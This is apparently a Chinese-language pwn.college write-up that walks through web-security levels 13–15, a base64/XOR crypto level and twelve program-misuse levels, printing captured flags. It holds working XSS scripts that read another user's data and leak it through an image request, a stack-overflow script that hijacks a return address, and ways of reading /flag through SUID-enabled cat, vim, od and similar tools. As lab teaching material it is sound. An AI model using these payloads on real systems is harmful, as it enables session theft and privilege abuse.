        if request_user_id == session_user_id:
            info.append(request_user[&quot;password&quot;])
        return &quot; &quot;.join(info) + &quot;\n&quot;

    if request.path == &quot;/visit&quot;:
        url = request.args.get(&quot;url&quot;)
        assert url, &quot;Missing `url` argument&quot;

        url_arg_parsed = urllib.parse.urlparse(url)
        assert url_arg_parsed.hostname == challenge_host, f&quot;Invalid `url`, hostname should be `{challenge_host}`&quot;

        with run_browser() as browser:
            browser.get(f&quot;http://{challenge_host}/login&quot;)

            user_form = {
                &quot;username&quot;: &quot;flag&quot;,
                &quot;password&quot;: flag,
            }
            for name, value in user_form.items():
                field = browser.find_element(By.NAME, name)
                field.send_keys(value)

            submit_field = browser.find_element(By.ID, &quot;submit&quot;)
            submit_field.submit()
            WebDriverWait(browser, 10).until(EC.staleness_of(submit_field))

            browser.get(url)
            time.sleep(1)

        return &quot;Visited\n&quot;

    if request.path == &quot;/echo&quot;:
        echo = request.args.get(&quot;echo&quot;)
        assert echo, &quot;Missing `echo` argument&quot;
        return html(echo)

    return &quot;Not Found\n&quot;, 404
</code></pre>
<p>看了一下，这次没有leak路由了，同时多了这样一句</p>
<pre><code>app.config['SESSION_COOKIE_HTTPONLY'] = False
</code></pre>
<p>这是关闭了 Flask 应用程序的 HTTP-only 会话 cookie 选项</p>
<blockquote>
<p>HTTP-only 会话 cookie 选项是一个安全机制，它可以防止恶意脚本（如跨站脚本攻击）从浏览器中窃取会话 cookie。当启用 HTTP-only 选项时，浏览器将禁止 JavaScript 访问会话 cookie，这意味着即使恶意脚本能够执行，也无法访问该 cookie。</p>
</blockquote>
<blockquote>
<p>如果关闭了 Flask 应用程序的 HTTP-only 会话 cookie 选项，会话 cookie 将变得更加容易受到攻击。例如，恶意脚本可以通过 JavaScript 访问会话 cookie，然后将其发送到攻击者的服务器，从而劫持用户的会话。此外，如果会话 cookie 包含敏感信息，例如用户名和密码，攻击者可以轻松地窃取这些信息，然后用于恶意目的。</p>
</blockquote>
<p>这也就是level13的核心了。注意，此时我们不需要服务器了，因为并不需要从<code>hacker</code>访问了</p>
<p>然后差不多，就是写一个请求，把获取cookie的语句塞到里面即可,这个javascript的讲解在<a href="https://discord.com/channels/750635557666816031/1097285456460251156/1097312950072643654">discord</a>上有，一定要去看一看这个，十分的清晰！</p>
<pre><code>import requests

r = requests.get('http://challenge.localhost/visit?url=http://challenge.localhost/echo?echo=&lt;script&gt;var xhttp = new XMLHttpRequest();xhttp.open(&quot;GET&quot;,&quot;http://challenge.localhost/info?user=1&quot;,true);xhttp.onreadystatechange = function(){document.getElementById(&quot;n&quot;).src = xhttp.responseText;};xhttp.send();&lt;/script&gt;&lt;img src = &quot;n&quot; id=&quot;n&quot;&gt;')
print(r.content.decode())
</code></pre>
<p>发现flag在get里面，我震惊</p>
<pre><code>&quot;GET /flag%20pwn.college{Iw5PLCtom_udyT1-ZfKq0ziXEhh.dlTOzMDL2QjMyMzW} HTTP/1.1&quot; 404 -
</code></pre>
<h2 id="level14-exploit-a-cross-site-scripting-vulnerability-to-exfilitrate-user-data"><a class="header" href="#level14-exploit-a-cross-site-scripting-vulnerability-to-exfilitrate-user-data">level14 Exploit a cross site scripting vulnerability to exfilitrate user data</a></h2>
<pre><code>def level14():
    db.execute((&quot;CREATE TABLE IF NOT EXISTS users AS &quot;
                'SELECT &quot;flag&quot; AS username, ? as password'),
               (flag,))

    if request.path == &quot;/login&quot;:
        if request.method == &quot;POST&quot;:
            username = request.form.get(&quot;username&quot;)
            password = request.form.get(&quot;password&quot;)
            assert username, &quot;Missing `username` form&quot;
            assert password, &quot;Missing `password` form&quot;

            user = db.execute(f&quot;SELECT rowid, * FROM users WHERE username = ? AND password = ?&quot;, (username, password)).fetchone()
            assert user, &quot;Invalid `username` or `password`&quot;

            session[&quot;user&quot;] = int(user[&quot;rowid&quot;])
            return redirect(request.path)

        return form([&quot;username&quot;, &quot;password&quot;])

    if request.path == &quot;/info&quot;:
        session_user_id = int(session.get(&quot;user&quot;, -1))
        session_user = db.execute(&quot;SELECT * FROM users WHERE rowid = ?&quot;, (session_user_id,)).fetchone()

        request_user_id = int(request.args.get(&quot;user&quot;, session_user_id))
        request_user = db.execute(&quot;SELECT * FROM users WHERE rowid = ?&quot;, (request_user_id,)).fetchone()
        assert request_user, &quot;Invalid `user`&quot;

        info = [request_user[&quot;username&quot;]]
        if request_user_id == session_user_id:
            info.append(request_user[&quot;password&quot;])
        return &quot; &quot;.join(info) + &quot;\n&quot;

    if request.path == &quot;/visit&quot;:
        url = request.args.get(&quot;url&quot;)
        assert url, &quot;Missing `url` argument&quot;

        url_arg_parsed = urllib.parse.urlparse(url)
        assert url_arg_parsed.hostname == challenge_host, f&quot;Invalid `url`, hostname should be `{challenge_host}`&quot;

        with run_browser() as browser:
            browser.get(f&quot;http://{challenge_host}/login&quot;)

            user_form = {
                &quot;username&quot;: &quot;flag&quot;,
                &quot;password&quot;: flag,
            }
            for name, value in user_form.items():
                field = browser.find_element(By.NAME, name)
                field.send_keys(value)

            submit_field = browser.find_element(By.ID, &quot;submit&quot;)
            submit_field.submit()
            WebDriverWait(browser, 10).until(EC.staleness_of(submit_field))

            browser.get(url)
            time.sleep(1)

        return &quot;Visited\n&quot;

    if request.path == &quot;/echo&quot;:
        echo = request.args.get(&quot;echo&quot;)
        assert echo, &quot;Missing `echo` argument&quot;
        return html(echo)

    return &quot;Not Found\n&quot;, 404
</code></pre>
<p>这个也是不需要服务器的，和13的区别在于删去了http session那句话，也就是说不能读取出来然后在使用比如curl等方式传递这个cookie了，但是可以直接在js之中调用，也就是说，这个答案和level13是一样的！</p>
<pre><code>import requests

r = requests.get('http://challenge.localhost/visit?url=http://challenge.localhost/echo?echo=&lt;img src = &quot;n&quot; id=&quot;n&quot;&gt;&lt;script&gt;var xhttp = new XMLHttpRequest();xhttp.open(&quot;GET&quot;,&quot;http://challenge.localhost/info?user=1&quot;,true);xhttp.onreadystatechange = function(){document.getElementById(&quot;n&quot;).src = this.responseText;};xhttp.send();&lt;/script&gt;').content.decode()
print(r.text)
</code></pre>
<p>然后还是在get之中</p>
<pre><code>GET /flag%20pwn.college{geCA9st3ZYLR66SVt816em8X9HG.dBDM0MDL2QjMyMzW}
</code></pre>
<h2 id="level15-exploit-a-memory-corruption-stack-injection-vulnerability"><a class="header" href="#level15-exploit-a-memory-corruption-stack-injection-vulnerability">level15 Exploit a (memory corruption) stack injection vulnerability</a></h2>
<pre><code>def level15():
    if &quot;libgreet&quot; not in globals():
        global libgreet
        shared_library_file = tempfile.NamedTemporaryFile(&quot;x&quot;, suffix=&quot;.so&quot;)
        gcc_args = [&quot;/usr/bin/gcc&quot;, &quot;-x&quot;, &quot;c&quot;, &quot;-shared&quot;, &quot;-fPIC&quot;, &quot;-fno-stack-protector&quot;, &quot;-o&quot;, shared_library_file.name, &quot;-&quot;]
        subprocess.run(gcc_args, input=r&quot;&quot;&quot;
        #include &lt;unistd.h&gt;
        #include &lt;fcntl.h&gt;
        #include &lt;stdio.h&gt;
        #include &lt;string.h&gt;

        void __attribute__ ((constructor)) disable_buffering(void) {
          setvbuf(stdout, NULL, _IONBF, 0);
        }

        void win(void)
        {
          char flag[256] = { 0 };
          int flag_fd;

          puts(&quot;You win! Here is your flag:&quot;);

          flag_fd = open(&quot;/flag&quot;, 0);
          read(flag_fd, flag, sizeof(flag));
          puts(flag);
        }

        void * win_address(void)
        {
          return win;
        }

        void greet(char *name, size_t length)
        {
          char buffer[256] = { 0 };

          memcpy(buffer, &quot;Hello, &quot;, 7);
          memcpy(buffer + 7, name, length);
          memcpy(buffer + 7 + length, &quot;!&quot;, 1);

          puts(buffer);
        }
        &quot;&quot;&quot;.encode())
        libgreet = ctypes.CDLL(shared_library_file.name)
        libgreet.win_address.restype = ctypes.c_void_p

    if request.path == &quot;/win_address&quot;:
        return f&quot;{hex(libgreet.win_address())}\n&quot;

    if request.path == &quot;/greet&quot;:
        name = request.args.get(&quot;name&quot;)
        assert name, &quot;Missing `name` argument&quot;

        def stream_greet():
            r, w = os.pipe()
            pid = os.fork()

            if pid == 0:
                os.close(r)
                os.dup2(w, 1)
                name_buffer = ctypes.create_string_buffer(name.encode(&quot;latin&quot;))
                libgreet.greet(name_buffer, len(name))
                os._exit(0)

            os.close(w)
            while True:
                data = os.read(r, 256)
                if not data:
                    break
                yield data
            os.wait()

        return stream_greet()

    return &quot;Not Found\n&quot;, 404
</code></pre>
<p>很好，再次求助chatgpt：</p>
<blockquote>
<p>这段代码定义了一个名为 level15() 的函数，它似乎是一个 Flask 路由处理程序。这个函数的作用是：</p>
</blockquote>
<blockquote>
<p>如果 libgreet 不在全局变量中，则使用 GCC 编译器编译一个共享库，并将其加载到 libgreet 变量中。这个共享库包含一个名为 win() 的函数，它会读取 /flag 文件并将其内容输出为标准输出流；还包含一个名为 greet() 的函数，它会将一个字符串参数作为问候语输出到标准输出流。这个共享库还包含一个名为 win_address() 的函数，它会返回 win() 函数的地址。</p>
</blockquote>
<blockquote>
<p>如果请求的路径为 /win_address，则返回 win() 函数的地址。</p>
</blockquote>
<blockquote>
<p>如果请求的路径为 /greet，则从请求参数中获取一个名为 name 的字符串参数，并使用 greet() 函数向客户端发送一条问候语。为了避免缓冲区溢出等安全问题，它使用了 ctypes.create_string_buffer() 函数来创建一个名为 name_buffer 的缓冲区，并将其传递给 greet() 函数。为了将 greet() 函数的输出流与客户端的响应流相连接，它使用了 Unix 管道和子进程来实现流式输出。</p>
</blockquote>
<blockquote>
<p>如果请求的路径不是 /win_address 或 /greet，则返回一个 404 响应。</p>
</blockquote>
<blockquote>
<p>总体来说，这个函数似乎是一个非常危险的路由处理程序，因为它使用了动态编译和加载共享库的技术，并且使用了 Unix 管道和子进程来实现流式输出。这些技术都可能会导致安全漏洞，例如缓冲区溢出、代码注入、代码执行等问题。建议谨慎使用这种技术，并且在使用时应该加强安全性的措施。</p>
</blockquote>
<p>其实这个是很简单的shellcode。</p>
<pre><code>hacker@web-security-level-15:~$ curl challenge.localhost/win_address
0x7fa506d8f1c5
hacker@web-security-level-15:~$
</code></pre>
<p>首先，在源码里没有win函数的地址，因此我们需要curl一下，然后拿到这个地址</p>
<pre><code>hacker@web-security-level-15:~$ curl challenge.localhost/win_address
0x7fa506d8f1c5
</code></pre>
<p>然后，写脚本，逐步增加a的数量，希望逐渐增加 name 参数的长度。当 name 参数的长度达到一定值时，就会覆盖 greet() 函数的返回地址，</p>
<pre><code>import requests
for i in range (250,270):
    address = (&quot;a&quot;*i + &quot;\xc5\xf1\xd8\x06\xa5\x7f\x00\x00&quot;)
    params = {&quot;name&quot;: address.encode(&quot;utf-8&quot;)}

    r = requests.get(&quot;http://challenge.localhost/greet&quot;,params=params)
    if &quot;win&quot; in r.text:
        print(r.text)
</code></pre>
<p>拿到flag</p>
<pre><code>hacker@web-security-level-15:~$ python test.py
Hello, aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaÅñØ¥
You win! Here is your flag:
pwn.college{EHqxRFRVOPcCUXWv8Sf1Qk3NLxi.dFDM0MDL2QjMyMzW}


hacker@web-security-level-15:~$
</code></pre>
<p>事实上打印了一下i发现是257 ，也就是说win函数紧挨着greet函数，可能这是题目故意设置的吧hhh。</p>
<div style="break-before: page; page-break-before: always;"></div><h1 id="level1-1"><a class="header" href="#level1-1">level1</a></h1>
<p>直接使用python内置的base64模块进行解码。</p>
<pre><code class="language-python">import base64

# Base64-encoded string
base64_string = &quot;cHduLmNvbGxlZ2V7Z0dBNWR1UjdUVnJmYno5d0lweThmS1VnS1FrLmROek56TURMMlFqTXlNeld9Cg==&quot;

# Decode the string to bytes
base64_bytes = base64_string.encode('ascii')
message_bytes = base64.b64decode(base64_bytes)

# Decode the bytes to UTF-8 string
message = message_bytes.decode('utf-8')

print(message)

</code></pre>
<h2 id="ref-2"><a class="header" href="#ref-2">ref</a></h2>
<p>Base64编码和解码是一种将二进制数据转换为可打印ASCII字符格式的方法。该算法基于64个不同字符的子集，由大小写字母、数字、加号和正斜杠组成。</p>
<p>Base64编码的过程如下：</p>
<ol>
<li>将输入的二进制数据按每6个比特进行分组</li>
<li>将每个6比特组转换为相应的Base64字符</li>
<li>如果剩余比特数不足6比特，则使用等号（<code>=</code>）补齐。</li>
</ol>
<p>例如，将ASCII字符<code>Man</code>进行Base64编码，可以按以下方式进行：</p>
<pre><code>ASCII字符：     M       a       n
ASCII码（二进制） 01001101 01100001 01101110
6比特分组：     010011 010110 000101 101110
Base64字符：     S       m       F       u
</code></pre>
<p>因此，<code>Man</code>的Base64编码为<code>SmFu</code>。</p>
<p>Base64解码过程如下：</p>
<ol>
<li>将Base64编码的字符串转换为对应的二进制数据</li>
<li>将二进制数据按每8个比特进行分组</li>
<li>将每个8比特组转换为相应的ASCII字符</li>
</ol>
<p>例如，将<code>SmFu</code>进行Base64解码，可以按以下方式进行：</p>
<pre><code>Base64字符：     S       m       F       u
6比特分组：     010011 010110 000101 101110
ASCII码（二进制） 01001101 01100001 01101110
ASCII字符：     M       a       n
</code></pre>
<p>因此，<code>SmFu</code>的Base64解码为<code>Man</code>。</p>
<p>Base64编码和解码是一种常用的技术，用于在网络应用程序中传输二进制数据。通过编码二进制数据，可以确保它们传输时避免出现特殊字符或不受支持的格式。</p>
<h1 id="level2-1"><a class="header" href="#level2-1">level2</a></h1>
<pre><code class="language-python">import base64

key_str = &quot;xMQGl4LY1hyH7Khz155o3MedyLAedmm3H56HBvCvQHlzUkuTklt4ejKly8iRul/MH0kTNBGYpPGK3Q==&quot;
ciphertext_str = &quot;tLNoueG3unDii80I4/YptLXTj+NPJz7SZc7PWajGIREGIXvQ5ygwVFb3sYbr9xuALRh5eWjV3qb31w==&quot;

# 解码密钥和密文
key = base64.b64decode(key_str)
ciphertext = base64.b64decode(ciphertext_str)

# 对密文使用密钥进行异或操作
plaintext = bytearray(len(ciphertext))
for i in range(len(ciphertext)):
    plaintext[i] = ciphertext[i] ^ key[i % len(key)]

# 将获得的字节序列转换为字符串
original_text = plaintext.decode('utf-8')

print(original_text)
</code></pre>
<div style="break-before: page; page-break-before: always;"></div><h1 id="cse466"><a class="header" href="#cse466">CSE466</a></h1>
<p>fall22</p>
<h1 id="模块总结-1"><a class="header" href="#模块总结-1">模块总结</a></h1>
<h2 id="program-misuse"><a class="header" href="#program-misuse">program misuse</a></h2>
<p>这个模块比较基础，大部分是让你认识linux下的各种工具。对新人（指至少熟悉其中部分工具但没接触过CTF的人）来说应该启发很大，很多工具虽然设计出来并不是为了读取文件内容，但是由于其支持调试、输出错误信息、甚至是调用其他程序等种种运行方式，你可以通过这些方法得到文件内容。其实我认为这是让你关注那些工具不常用的功能，比如我一直在使用tldr，但tldr之中没有不常用的参数，因此做了几个题以后就不太适合这个挑战了。同时，作为CTF人，应该对权限很敏感，在一个工具有suid的情况下，深挖这个工具。我想这就是这个模块所能带来的启发了。</p>
<h1 id="讲解-1"><a class="header" href="#讲解-1">讲解</a></h1>
<p>YOUTUBE上pwn college上传了老师的讲解，大多数很细致，少部分没有完成给出过程，但都有思路，需要自己去实现。其实在实现了之后发现也就是这么回事儿，但是思考的过程有时候是痛苦的。</p>
<h1 id="我参考过的所有链接"><a class="header" href="#我参考过的所有链接">我参考过的所有链接</a></h1>
<ul>
<li><a href="https://www.freebuf.com/author/thundersword">一个博主</a></li>
<li><a href="https://j-shiro.github.io/">一个做了不少的同学</a></li>
<li><a href="https://hurricane618.me/2022/05/26/pwn-college-writeup-one/">一个不算特别具体的wp</a></li>
<li><a href="https://www.cnblogs.com/crybaby/">有一点点</a></li>
<li><a href="https://s0uthwood.github.io/">也不太多</a></li>
<li><a href="https://i3r0nya.cn/categories/pwn/">一个老哥记录的自己不会的题，无具体wp</a></li>
<li><a href="https://imaxct.dev/2023/02/25/PwnCollege-baby-shell-writeup/">只有babyshell</a></li>
<li><a href="https://blog.junyu33.me/2032/07/03/pwn_college.html">部分题解</a></li>
<li><a href="https://s0merset7.github.io/posts/">一个神奇的老哥，全是笔记，没有wp</a></li>
<li><a href="https://mp.weixin.qq.com/s/VoS5pwBkrq8k_WVVttBr4w">微信公众号文章，只有misuse部分</a></li>
</ul>
<p>很多题，不同人的解法真是不一样，可以多看看，参考着做，会有启发的。</p>
<div style="break-before: page; page-break-before: always;"></div><h1 id="knowledge-1"><a class="header" href="#knowledge-1">knowledge</a></h1>
<h2 id="基本知识"><a class="header" href="#基本知识">基本知识</a></h2>
<p>linux、命令行、进程、文件系统、目录、软连接和硬链接、路径（绝对、相对）、管道、重定向</p>
<h5 id="ref-3"><a class="header" href="#ref-3">ref</a></h5>
<p>关于软连接，这里有几个不错的参考</p>
<ul>
<li><a href="https://xzchsia.github.io/2020/03/05/linux-hard-soft-link/">挺清楚的讲解</a></li>
<li><a href="https://www.runoob.com/note/29134">菜鸟</a></li>
</ul>
<p>然后是权限、提权的内容</p>
<p>这里需要明白权限、用户、用户组这些概念，以及非常非常重要的uid gid等内容</p>
<pre><code>SUID: execute with the eUID of the file owner rather than the parent process.
SGID: execute with the eGID of the file owner rather than the parent process.
Sticky: used for shared directories to limit file removal to file owners.

Three different type of user and group IDs:

Effective (eUID, eGID): the UID/GID used for most access checks.
Real (UID, GID): the &quot;real&quot; UID (or GID) of the process owner, used for things such as signal checks.
Saved: a UID/GID that your process could switch its eUID/eGID to. Used for temporarily dropping privileges.
</code></pre>
<h5 id="ref-4"><a class="header" href="#ref-4">ref</a></h5>
<ul>
<li><a href="https://www.cnblogs.com/limingluzhu/p/5702486.html">一个博客</a></li>
<li><a href="https://www.junmajinlong.com/linux/euid_ruid/">这个博客的风格我很喜欢，哪天偷过来</a></li>
</ul>
<h1 id="challenges"><a class="header" href="#challenges">challenges</a></h1>
<h2 id="useful-shell"><a class="header" href="#useful-shell">useful shell</a></h2>
<pre><code>#!/bin/bash

# 进入/challenge目录
cd /challenge

# 获取该目录下唯一的文件名
filename=$(ls)

# 执行该文件
./$filename
</code></pre>
<p>then</p>
<pre><code>sh filename.sh
</code></pre>
<h2 id="level1-lets-you-directly-read-the-flag"><a class="header" href="#level1-lets-you-directly-read-the-flag">level1 Lets you directly read the flag!</a></h2>
<pre><code>hacker@program-misuse-level-1:/challenge$ ./babysuid_level1
Welcome to ./babysuid_level1!

This challenge is part of a series of programs that
exposes you to very simple programs that let you directly read the flag.

I just set the SUID bit on /usr/bin/cat.
Try to use it to read the flag!

IMPORTANT: make sure to run me (./babysuid_level1) every time that you restart
this challenge container to make sure that I set the SUID bit on /usr/bin/cat!
hacker@program-misuse-level-1:/challenge$
</code></pre>
<p>已经给我uid了，然后我直接读取即可</p>
<pre><code>hacker@program-misuse-level-1:/$ ls
bin  boot  challenge  dev  etc  flag  home  lib  lib32  lib64  libx32  media  mnt  opt  proc  root  run  sbin  srv  sys  tmp  usr  var
hacker@program-misuse-level-1:/$ cat flag
pwn.college{gtmGRqQdewLiKKwB2Wi1NeBxX3w.01M0EDL2QjMyMzW}
hacker@program-misuse-level-1:/$
</code></pre>
<h2 id="level2-lets-you-directly-read-the-flag"><a class="header" href="#level2-lets-you-directly-read-the-flag">level2 Lets you directly read the flag!</a></h2>
<pre><code>hacker@program-misuse-level-2:/challenge$ ./babysuid_level2
Welcome to ./babysuid_level2!

This challenge is part of a series of programs that
exposes you to very simple programs that let you directly read the flag.

I just set the SUID bit on /usr/bin/more.
Try to use it to read the flag!

IMPORTANT: make sure to run me (./babysuid_level2) every time that you restart
this challenge container to make sure that I set the SUID bit on /usr/bin/more!
hacker@program-misuse-level-2:/challenge$
</code></pre>
<p>这个是用 <code>more</code> 读取</p>
<pre><code>hacker@program-misuse-level-2:/challenge$ more /flag
pwn.college{g0orxg7_IfgidrE5G2scOM8wdRx.0FN0EDL2QjMyMzW}
hacker@program-misuse-level-2:/challenge$
</code></pre>
<h2 id="level3-lets-you-directly-read-the-flag"><a class="header" href="#level3-lets-you-directly-read-the-flag">level3 Lets you directly read the flag!</a></h2>
<pre><code>hacker@program-misuse-level-3:/challenge$ ./babysuid_level3
Welcome to ./babysuid_level3!

This challenge is part of a series of programs that
exposes you to very simple programs that let you directly read the flag.

I just set the SUID bit on /usr/bin/less.
Try to use it to read the flag!

IMPORTANT: make sure to run me (./babysuid_level3) every time that you restart
this challenge container to make sure that I set the SUID bit on /usr/bin/less!
hacker@program-misuse-level-3:/challenge$
</code></pre>
<p>这次是用<code>less</code></p>
<pre><code>hacker@program-misuse-level-3:/challenge$ less /flag
pwn.college{onJWxeGXCk8o-LqXlLemr-Xzk2W.0VN0EDL2QjMyMzW}
/flag (END)

</code></pre>
<p>less比more好用，记得使用q退出</p>
<h2 id="level4-lets-you-directly-read-the-flag"><a class="header" href="#level4-lets-you-directly-read-the-flag">level4 Lets you directly read the flag!</a></h2>
<pre><code>hacker@program-misuse-level-4:/challenge$ ./babysuid_level4
Welcome to ./babysuid_level4!

This challenge is part of a series of programs that
exposes you to very simple programs that let you directly read the flag.

I just set the SUID bit on /usr/bin/tail.
Try to use it to read the flag!

IMPORTANT: make sure to run me (./babysuid_level4) every time that you restart
this challenge container to make sure that I set the SUID bit on /usr/bin/tail!
hacker@program-misuse-level-4:/challenge$
</code></pre>
<p>用<code>tail</code></p>
<pre><code>hacker@program-misuse-level-4:/challenge$ tail /flag
pwn.college{8A8n6zzy-sUTn179ZADopx1lzFV.0lN0EDL2QjMyMzW}
hacker@program-misuse-level-4:/challenge$
</code></pre>
<p>我现在猜下一个用head</p>
<h2 id="level5-lets-you-directly-read-the-flag"><a class="header" href="#level5-lets-you-directly-read-the-flag">level5 Lets you directly read the flag!</a></h2>
<pre><code>hacker@program-misuse-level-5:~$ sh file.sh
Welcome to ./babysuid_level5!

This challenge is part of a series of programs that
exposes you to very simple programs that let you directly read the flag.

I just set the SUID bit on /usr/bin/head.
Try to use it to read the flag!

IMPORTANT: make sure to run me (./babysuid_level5) every time that you restart
this challenge container to make sure that I set the SUID bit on /usr/bin/head!
hacker@program-misuse-level-5:~$
</code></pre>
<p>果然用head</p>
<pre><code>hacker@program-misuse-level-5:~$ head /flag
pwn.college{wVl3wFV0tMkY6rAFaMWKvEoOt2R.01N0EDL2QjMyMzW}
hacker@program-misuse-level-5:~$
</code></pre>
<h2 id="level6-lets-you-directly-read-the-flag"><a class="header" href="#level6-lets-you-directly-read-the-flag">level6 Lets you directly read the flag!</a></h2>
<pre><code>hacker@program-misuse-level-6:~$ sh file.sh
Welcome to ./babysuid_level6!

This challenge is part of a series of programs that
exposes you to very simple programs that let you directly read the flag.

I just set the SUID bit on /usr/bin/sort.
Try to use it to read the flag!

IMPORTANT: make sure to run me (./babysuid_level6) every time that you restart
this challenge container to make sure that I set the SUID bit on /usr/bin/sort!
hacker@program-misuse-level-6:~$ sort /flag
pwn.college{wRB7HgX_kvB4Uro33D7t1UKWZcE.0FO0EDL2QjMyMzW}
hacker@program-misuse-level-6:~$
</code></pre>
<p>这次居然是用sort</p>
<p><strong>这里做一个小总结，以上这几个工具都非常常用，而且经常是组合使用的，建议使用<code>man</code>阅读手册，然后多尝试搭配使用。</strong></p>
<h2 id="level7-shows-you-that-an-over-privileged-editor-is-a-very-powerful-tool"><a class="header" href="#level7-shows-you-that-an-over-privileged-editor-is-a-very-powerful-tool">level7 Shows you that an over-privileged editor is a very powerful tool!</a></h2>
<pre><code>hacker@program-misuse-level-7:~$ sh file.sh
Welcome to ./babysuid_level7!

This challenge is part of a series of programs that
shows you that an over-privileged editor is a very powerful tool, indeed.

I just set the SUID bit on /usr/bin/vim.
Try to use it to read the flag!

IMPORTANT: make sure to run me (./babysuid_level7) every time that you restart
this challenge container to make sure that I set the SUID bit on /usr/bin/vim!
hacker@program-misuse-level-7:~$ vim /flag
</code></pre>
<p>从标题能看出来是用某种编辑工具，这次是<code>vim</code></p>
<pre><code>pwn.college{YA-02bwpz2aH0bVuFckXnVUE_a8.0VO0EDL2QjMyMzW}
</code></pre>
<p>我猜后边儿得有nano emacs等等</p>
<h2 id="level8-shows-you-that-an-over-privileged-editor-is-a-very-powerful-tool"><a class="header" href="#level8-shows-you-that-an-over-privileged-editor-is-a-very-powerful-tool">level8 Shows you that an over-privileged editor is a very powerful tool!</a></h2>
<pre><code>hacker@program-misuse-level-8:~$ sh file.sh
Welcome to ./babysuid_level8!

This challenge is part of a series of programs that
shows you that an over-privileged editor is a very powerful tool, indeed.

I just set the SUID bit on /usr/bin/emacs.
Try to use it to read the flag!

IMPORTANT: make sure to run me (./babysuid_level8) every time that you restart
this challenge container to make sure that I set the SUID bit on /usr/bin/emacs!
</code></pre>
<p>果然不出我所料hhh</p>
<pre><code>pwn.college{sCKRHf2_yRVb3Q_MEPjyLzcoqdN.0FM1EDL2QjMyMzW}
</code></pre>
<p>emacs也是一个强大的工具，可以学一学。</p>
<p>这里退出命令是<C-x> <C-c></p>
<h2 id="level9-shows-you-that-an-over-privileged-editor-is-a-very-powerful-tool"><a class="header" href="#level9-shows-you-that-an-over-privileged-editor-is-a-very-powerful-tool">level9 Shows you that an over-privileged editor is a very powerful tool!</a></h2>
<pre><code>hacker@program-misuse-level-9:~$ sh file.sh
Welcome to ./babysuid_level9!

This challenge is part of a series of programs that
shows you that an over-privileged editor is a very powerful tool, indeed.

I just set the SUID bit on /usr/bin/nano.
Try to use it to read the flag!

IMPORTANT: make sure to run me (./babysuid_level9) every time that you restart
this challenge container to make sure that I set the SUID bit on /usr/bin/nano!
hacker@program-misuse-level-9:~$ nano /flag
</code></pre>
<p>我果然料事如神</p>
<pre><code>pwn.college{w4DHxmYT2HQw-wrXkHpQXqNmIWW.0VM1EDL2QjMyMzW}
</code></pre>
<p>退出命令是<C-x></p>
<h2 id="level10-requires-you-to-understand-their-output-to-derive-the-flag-from-it"><a class="header" href="#level10-requires-you-to-understand-their-output-to-derive-the-flag-from-it">level10 Requires you to understand their output to derive the flag from it!</a></h2>
<p><img src="CSE466/image.png" alt="切换" />
一句题外话，不同挑战之间无缝切换好快啊，很适合Linux直接用terminal链接！</p>
<pre><code>hacker@program-misuse-level-10:~$ sh file.sh
Welcome to ./babysuid_level10!

This challenge is part of a series of programs that
require you to understand their output to derive the flag from it.

I just set the SUID bit on /usr/bin/rev.
Try to use it to read the flag!

IMPORTANT: make sure to run me (./babysuid_level10) every time that you restart
this challenge container to make sure that I set the SUID bit on /usr/bin/rev!
</code></pre>
<p><code>rev</code>是反序输出的工具</p>
<p>但是难不住我</p>
<pre><code>hacker@program-misuse-level-10:~$ rev /flag
}WzMyMjQ2LDE1Ml0.iqRmReNkY5WaIyBZQULv-MYk7kI{egelloc.nwp
hacker@program-misuse-level-10:~$ rev /flag | rev
pwn.college{Ik7kYM-vLUQZByIaW5YkNeRmRqi.0lM1EDL2QjMyMzW}
hacker@program-misuse-level-10:~$
</code></pre>
<h2 id="level11-requires-you-to-understand-their-output-to-derive-the-flag-from-it"><a class="header" href="#level11-requires-you-to-understand-their-output-to-derive-the-flag-from-it">level11 Requires you to understand their output to derive the flag from it!</a></h2>
<pre><code>hacker@program-misuse-level-11:~$ sh file.sh
Welcome to ./babysuid_level11!

This challenge is part of a series of programs that
require you to understand their output to derive the flag from it.

I just set the SUID bit on /usr/bin/od.
Try to use it to read the flag!

IMPORTANT: make sure to run me (./babysuid_level11) every time that you restart
this challenge container to make sure that I set the SUID bit on /usr/bin/od!
</code></pre>
<p><code>od</code>通常用于以八进制或十六进制格式显示文件的内容。</p>
<pre><code>hacker@program-misuse-level-11:~$ od -A x -t x1z -v /flag
000000 70 77 6e 2e 63 6f 6c 6c 65 67 65 7b 73 4b 47 35  &gt;pwn.college{sKG5&lt;
000010 6d 6b 70 75 44 35 38 63 71 76 44 65 33 32 39 4e  &gt;mkpuD58cqvDe329N&lt;
000020 57 6c 4f 36 31 41 39 2e 30 31 4d 31 45 44 4c 32  &gt;WlO61A9.01M1EDL2&lt;
000030 51 6a 4d 79 4d 7a 57 7d 0a                       &gt;QjMyMzW}.&lt;
000039
hacker@program-misuse-level-11:~$
</code></pre>
<p>看了文档就会了，这个命令直接写在文档里。</p>
<pre><code>pwn.college{sKG5mkpuD58cqvDe329NWlO61A9.01M1EDL2QjMyMzW}
</code></pre>
<h2 id="level12-requires-you-to-understand-their-output-to-derive-the-flag-from-it"><a class="header" href="#level12-requires-you-to-understand-their-output-to-derive-the-flag-from-it">level12 Requires you to understand their output to derive the flag from it!</a></h2>
<pre><code>Welcome to ./babysuid_level12!

This challenge is part of a series of programs that
require you to understand their output to derive the flag from it.

I just set the SUID bit on /usr/bin/hd.
Try to use it to read the flag!

IMPORTANT: make sure to run me (./babysuid_level12) every time that you restart
this challenge container to make sure that I set the SUID bit on /usr/bin/hd!
</code></pre>
<p>奇怪的<code>hd</code>工具，十六进制的。</p>
<pre><code>hacker@program-misuse-level-12:~$ hd /flag
00000000  70 77 6e 2e 63 6f 6c 6c  65 67 65 7b 6f 47 7a 69  |pwn.college{oGzi|
00000010  37 55 30 32 58 54 6c 5f  64 73 6e 50 43 77 73 42  |7U02XTl_dsnPCwsB|
00000020  52 38 6d 59 54 77 6d 2e  30 46 4e 31 45 44 4c 32  |R8mYTwm.0FN1EDL2|
00000030  51 6a 4d 79 4d 7a 57 7d  0a                       |QjMyMzW}.|
00000039
hacker@program-misuse-level-12:~$ man hd
</code></pre>
